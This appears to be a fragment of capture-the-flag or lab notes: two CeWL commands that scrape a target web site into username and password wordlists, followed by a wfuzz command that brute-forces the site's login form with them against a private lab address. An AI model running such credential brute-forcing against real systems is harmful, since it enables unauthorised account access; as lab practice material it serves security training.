
```bash
cewl -d 2 -m 5 -w passwords.txt http://10.10.76.246 --with-numbers
cewl -d 0 -m 5 -w usernames.txt http://10.10.76.246/team.php --lowercase
```

```bash
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.76.246/login.php -d "username=FUZZ&password=FUZ2Z"
```